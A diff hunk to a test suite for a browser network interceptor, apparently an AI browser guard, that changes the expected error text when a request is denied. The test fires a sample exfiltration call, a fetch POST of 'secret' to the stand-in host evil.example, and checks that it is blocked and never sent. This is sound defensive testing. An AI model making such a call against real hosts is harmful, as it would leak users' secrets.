@@ -213,7 +213,7 @@ describe('installNetworkInterceptor — deny path', () => {
     try {
       await expect(
         window.fetch('https://evil.example/exfil', { method: 'POST', body: 'secret' })
-      ).rejects.toThrow(/blocked by delegation rule/);
+      ).rejects.toThrow(/blocked by AI Browser Guard/); // generic — no rule internals leak to the page
       expect(underlying).not.toHaveBeenCalled(); // request never went out
       expect(events).toHaveLength(0); // a denied request is not observed
     } finally {
